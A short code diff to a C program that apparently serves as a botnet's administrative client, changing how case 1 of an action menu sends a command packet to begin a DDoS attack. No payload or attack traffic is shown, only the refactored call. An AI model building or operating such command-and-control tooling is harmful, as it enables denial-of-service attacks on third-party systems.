@@ -79,7 +79,7 @@ int connection(const char* SERVER_ADDR, unsigned short SERVER_PORT) {
     switch (action) {
         case 1:
             printf("Sending a packet at the beginning of a DDoS attack...\n");
-            if (command_packet(sock, ADMIN_PACKET_CTYPE_COMMAND_DDOS, NULL) < 0) {
+            if (ddos_packet(sock, NULL) < 0) {
                 printf("Failed to command ddos send packet\n");
             }
         case 2:
